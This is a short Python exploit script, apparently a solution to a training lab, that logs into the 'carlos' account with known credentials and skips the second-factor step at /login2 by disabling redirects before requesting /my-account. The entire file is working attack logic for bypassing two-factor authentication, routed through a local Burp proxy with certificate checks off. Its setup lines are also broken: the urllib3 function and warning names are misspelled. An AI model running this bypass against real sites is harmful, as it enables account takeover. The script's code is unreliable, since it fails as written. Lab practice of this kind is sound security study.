import requests 
import sys
import urllib3

urllib3.disable_warning(urllib3.exceptions.InsecureRequestsWarning) #num:1

proxies = {'http' : 'http://127.0.0.1:8080','https' : 'https://127.0.0.1:8080'} # sending all the traffic through burp

def access_carlos_account(s,url):
	# log into carlos's account
	print('(*) logging into the account and bypassing 2FA verification')
	login_url = url + "/login" # this is the endpoint to login
	login_data = {"username":"carlos","password":"montoya"}
	r = s.post(login_url,data=login_data,allow_redirects=False,verify=False, proxies=proxies) #num:1

	# confirm the bypass
	myaccount_url = url + "/my-account"
	r = s.get(myaccount_url,verify=False,proxies=proxies) #num:2
	if "Log Out" in r.text:
		print("(*) successfully bypassed 2FA verification.")
	else:
		print("(*) Exploit Failed")
		sys.exit(-1)
def main():
	if len(sys.argv) != 2:
		print("(*) Usage : %s <url>" % sys.argv[0])
		print("(*) Example : %s www.example.com" % sys.argv[0])
		sys.exit(-1)

	s = requests.Session() # num:2
	url = sys.argv[1]
	access_carlos_account(s,url)
if __name__ == '__main__':
	main()


# num:1 --> this posts the form data but as required for the task we have to drop the post request
# when it hits /login2 which is why allow_redirects is set  to False

# num:2 --> verify is set to False because then it doesnt require to check if SSL and TLS certs
# are on or not

